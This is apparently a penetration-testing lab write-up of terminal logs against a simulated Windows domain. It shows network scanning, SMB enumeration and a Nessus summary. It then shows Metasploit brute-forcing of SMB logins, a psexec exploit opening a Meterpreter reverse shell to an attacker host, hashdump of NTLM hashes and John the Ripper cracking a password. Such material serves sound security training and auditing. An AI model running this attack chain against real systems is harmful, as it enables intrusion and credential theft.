# Phase 1: Infrastructure Discovery (Scenario 1)
## 1. Host Discovery & Service Versioning

```
[4/04/26 2:55:07] ┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -O -p 21,80,139,445,3389 192.168.1.0/24
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-04 14:55 EDT
Nmap scan report for pfSense.corp.local (192.168.1.1)
Host is up (0.0027s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   filtered ftp
80/tcp   open     http          nginx
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:65:D5:AC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 11.X (97%)
OS CPE: cpe:/o:freebsd:freebsd:11.2
Aggressive OS guesses: FreeBSD 11.2-RELEASE (97%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

Nmap scan report for 192.168.1.10
Host is up (0.0031s latency).

PORT     STATE  SERVICE       VERSION
21/tcp   closed ftp
80/tcp   closed http
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds?
3389/tcp closed ms-wbt-server
MAC Address: 00:0C:29:FA:D2:9A (VMware)
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.1.20
Host is up (0.0024s latency).

PORT     STATE  SERVICE       VERSION
21/tcp   open   ftp           vsftpd 3.0.5
80/tcp   closed http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:0C:29:40:29:52 (VMware)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Unix

Nmap scan report for 192.168.1.50
Host is up (0.0011s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   filtered ftp
80/tcp   filtered http
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:3D:26:D2 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

Nmap scan report for 192.168.1.100
Host is up (0.0020s latency).

PORT     STATE  SERVICE       VERSION
21/tcp   open   ftp           vsftpd 3.0.5
80/tcp   closed http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:0C:29:40:29:52 (VMware)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Unix

Nmap scan report for 192.168.1.101
Host is up (0.000096s latency).

PORT     STATE  SERVICE       VERSION
21/tcp   closed ftp
80/tcp   closed http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
Too many fingerprints match this host to give specific OS details
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (6 hosts up) scanned in 15.94 seconds
```

## 2. SMB User Enumeration (To find 'Employee1' or 'Administrator')

```
[4/04/26 2:59:56] ┌──(kali㉿kali)-[~]
└─$ enum4linux -U 192.168.1.10
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr  4 15:01:38 2026

 =========================================( Target Information )=========================================
                                                                                                                                                                          
Target ........... 192.168.1.10                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.1.10 )============================
                                                                                                                                                                          
                                                                                                                                                                          
[+] Got domain/workgroup name: CORP                                                                                                                                       
                                                                                                                                                                          
                                                                                                                                                                          
 ===================================( Session Check on 192.168.1.10 )===================================
                                                                                                                                                                          
                                                                                                                                                                          
[+] Server 192.168.1.10 allows sessions using username '', password ''                                                                                                    
                                                                                                                                                                          
                                                                                                                                                                          
 ================================( Getting domain SID for 192.168.1.10 )================================
                                                                                                                                                                          
Domain Name: CORP                                                                                                                                                         
Domain Sid: S-1-5-21-3284509366-1660811556-837649189

[+] Host is part of a domain (not a workgroup)                                                                                                                            
                                                                                                                                                                          
                                                                                                                                                                          
 =======================================( Users on 192.168.1.10 )=======================================
                                                                                                                                                                          
                                                                                                                                                                          
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                      
                                                                                                                                                                          
                                                                                                                                                                          

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                       
                                                                                                                                                                          
enum4linux complete on Sat Apr  4 15:01:41 2026
```
# Phase 2: Vulnerability Audit (On Kali)
## 1. Start the Nessus Service

```
[4/04/26 2:55:26] ┌──(kali㉿kali)-[~]
└─$ sudo systemctl start nessusd
```
### Access the Web UI
Open Firefox to: `https://127.0.0.1:8834`

### Extracted Audit Data : 

```
# Nessus Vulnerability Scan Report

## 1. Scan Overview
* **Scan Name:** scan
* **Policy / Scan Type:** Advanced Scan (Configured with edited settings and brute-force techniques enabled)
* **Status:** Completed
* **Scanner:** Local Scanner
* **Severity Base:** CVSS v3.0
* **Start Time:** March 25 at 8:23 PM
* **End Time:** March 25 at 8:42 PM
* **Elapsed Time:** 19 minutes

## 2. Host Summary
The scan targeted **2** hosts. Authentication **failed** for both hosts, indicating the scanner relied on uncredentialed network checks and the enabled brute-force techniques.

| Host IP Address | Authentication | Total Vulnerabilities | Breakdown |
| :--- | :--- | :--- | :--- |
| **192.168.1.10** | Fail | 60 | Exclusively Informational / Low |
| **192.168.1.20** | Fail | 34 | Mix of High, Medium, Low, and Informational |

## 3. Identified Vulnerabilities
Across the scanned hosts, **54** distinct vulnerability groupings were identified. Below is the detailed breakdown of the actionable findings (excluding informational/discovery items):

### High Severity (CVSS 7.0 - 8.9)
| Name | Family | CVSS v3.0 | Count |
| :--- | :--- | :--- | :--- |
| OpenSSH < 9.8 RCE | Misc. | 8.1 | 1 |

### Medium Severity (CVSS 4.0 - 6.9)
| Name | Family | CVSS v3.0 | Count |
| :--- | :--- | :--- | :--- |
| OpenSSH < 9.9p2 MitM | Misc. | 6.8 | 1 |
| OpenSSH < 9.9p2 DoS | Misc. | 5.9 | 1 |

### Low Severity (CVSS 0.1 - 3.9)
| Name | Family | CVSS v3.0 | Count |
| :--- | :--- | :--- | :--- |
| OpenSSH < 10.0 DisableForwarding | Misc. | 3.8 | 1 |
| OpenSSH < 10.1 / 10.1p1 Multiple Vulnerabilities | Misc. | 3.6 | 1 |
| ICMP Timestamp Request Remote Date Disclosure | General | 2.1 | 2 |

### Key Informational Findings (Discovery & Enumeration)
* **Nessus SYN scanner:** 14 instances
* **DCE Services Enumeration:** 11 instances
* **Service Detection:** 3 instances
* **Common Platform Enumeration (CPE):** 2 instances
* **Device Type:** 2 instances
* **DNS Server Detection:** 2 instances

## 4. Initial Observations & Recommendations
1. **Authentication Failure:** Because credentialed checks failed, the vulnerability count may not reflect the full internal attack surface of these hosts. Investigating the authentication failures is recommended for future scans.
2. **OpenSSH Vulnerabilities:** Target `192.168.1.20` appears to be running an outdated version of OpenSSH, flagging multiple vulnerabilities ranging from Low to High (RCE). Upgrading the OpenSSH package on this host should be prioritized.
3. **Information Disclosure:** Windows DCE enumeration and ICMP Timestamp disclosures indicate that basic reconnaissance is successfully extracting system details over the network.
```

# Phase 3: Exploitation & Lateral Movement (On Kali) (Senario 2)
### The Metasploit Breach

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > use auxiliary/scanner/smb/smb_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf auxiliary(scanner/smb/smb_login) > set SMBUser admin-audit
SMBUser => admin-audit
msf auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/kali/Desktop/Reduced_Wordlist.txt
PASS_FILE => /home/kali/Desktop/Reduced_Wordlist.txt
msf auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(scanner/smb/smb_login) > run
[*] 192.168.1.10:445      - 192.168.1.10:445 - Starting SMB login bruteforce
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:123456',
[!] 192.168.1.10:445      - No active DB -- Credential data will not be saved!
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:12345',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:123456789',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:password',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:iloveyou',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:princess',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:1234567',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:rockyou',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:12345678',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:abc123',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:nicole',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:daniel',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:babygirl',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:monkey',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:lovely',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:jessica',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:654321',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:michael',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:ashley',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:qwerty',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:111111',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:iloveu',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:000000',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:michelle',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:tigger',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:sunshine',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:chocolate',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:password1',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:soccer',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:anthony',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:friends',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:butterfly',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:purple',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:angel',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:jordan',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:liverpool',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:justin',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:loveme',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:fuckyou',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:123123',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:football',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:secret',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:andrea',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:carlos',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:jennifer',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:joshua',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:bubbles',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:1234567890',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:superman',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:hannah',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:amanda',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:loveyou',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:pretty',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:basketball',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:andrew',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:angels',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:tweety',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:flower',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:playboy',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:hello',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:elizabeth',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:hottie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:tinkerbell',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:charlie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:samantha',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:barbie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:chelsea',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:lovers',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:teamo',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:jasmine',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:brandon',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:666666',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:shadow',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:melissa',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:eminem',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:matthew',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:robert',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:danielle',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:forever',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:family',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:jonathan',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:987654321',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:computer',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:whatever',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:dragon',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:vanessa',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:cookie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:naruto',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:summer',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:sweety',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:spongebob',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:joseph',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:junior',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:softball',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:taylor',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:yellow',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:daniela',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:lauren',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:mickey',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:princesa',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:alexandra',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:alexis',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:jesus',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:estrella',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:miguel',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:william',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:thomas',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:beautiful',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:mylove',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:angela',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:poohbear',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:patrick',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:iloveme',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:sakura',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:adrian',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:Password123!',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:alexander',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:destiny',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:christian',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:121212',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:sayang',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:america',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:dancer',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:monica',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:richard',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:112233',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:princess1',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:555555',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:diamond',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:carolina',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:steven',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:rangers',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:louise',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:orange',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:789456',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:999999',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:shorty',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:11111',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:nathan',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:snoopy',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:gabriel',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:hunter',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:cherry',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:killer',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:sandra',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:alejandro',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:buster',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:george',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:brittany',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:alejandra',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:patricia',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:rachel',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:tequiero',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:7777777',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:cheese',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:159753',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:arsenal',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:dolphin',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:antonio',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:heather',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:david',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:ginger',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:stephanie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:peanut',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:blink182',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:sweetie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:222222',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:beauty',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:987654',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:victoria',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:honey',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:00000',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:fernando',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:pokemon',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:maggie',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:corazon',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:chicken',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:pepper',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:cristina',
[-] 192.168.1.10:445      - 192.168.1.10:445 - Failed: '.\admin-audit:rainbow',
[+] 192.168.1.10:445      - 192.168.1.10:445 - Success: '.\admin-audit:P@ssword2026!' Administrator
[*] 192.168.1.10:445      - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.1.10:445      - Bruteforce completed, 1 credential was successful.
[*] 192.168.1.10:445      - You can open an SMB session with these credentials and CreateSession set to true                                                          
[*] Auxiliary module execution completed
```
```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > 
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf exploit(windows/smb/psexec) > set SMBDomain CORP
SMBDomain => CORP
msf exploit(windows/smb/psexec) > set SMBUser admin-audit
SMBUser => admin-audit
msf exploit(windows/smb/psexec) > set SMBPass P@ssword2026!
SMBPass => P@ssword2026!
msf exploit(windows/smb/psexec) > 
msf exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set LHOST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(windows/smb/psexec) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/psexec) > 
msf exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 192.168.1.101:4444 
[*] 192.168.1.10:445 - Connecting to the server...
[*] 192.168.1.10:445 - Authenticating to 192.168.1.10:445|CORP as user 'admin-audit'...
[*] 192.168.1.10:445 - Selecting PowerShell target
[*] 192.168.1.10:445 - Executing the payload...
[+] 192.168.1.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (230982 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.10:50529) at 2026-04-04 15:53:18 -0400

meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbcfd43dfda21ef615975ab1da3d8e28:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fd35e27d3f95078c90725ef0e25ef4db:::
admin-audit:1000:aad3b435b51404eeaad3b435b51404ee:fbcfd43dfda21ef615975ab1da3d8e28:::
Employee1:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SRV-AD-01$:1001:aad3b435b51404eeaad3b435b51404ee:f725a0ff78f43cca15147736166306a5:::
DESKTOP-3NLDE32$:1105:aad3b435b51404eeaad3b435b51404ee:e29027774c664773580f0e5c22cba5b5:::
```
# Phase 4: Offline Credential Cracking (On Kali)

_for audting propuses we are going to use only one account to try and extract the password we are going to use Employee1 that is a machine that is registred under AD_

## 1. Save the Employee-01 hash to a file (Example format below)

```
echo Employee1:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: > Extracted_hash
```

## 2. Run John the Ripper to crack the hash

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo john --format=NT --wordlist=Reduced_Wordlist.txt Extracted_hash
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!     (Employee1)     
1g 0:00:00:00 DONE (2026-04-04 16:02) 33.33g/s 6733p/s 6733c/s 5050C/s 123456..september
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

## 3. View the cracked password

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --show --format=NT Extracted_hash                          
Employee1:Password123!:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

1 password hash cracked, 0 left
```
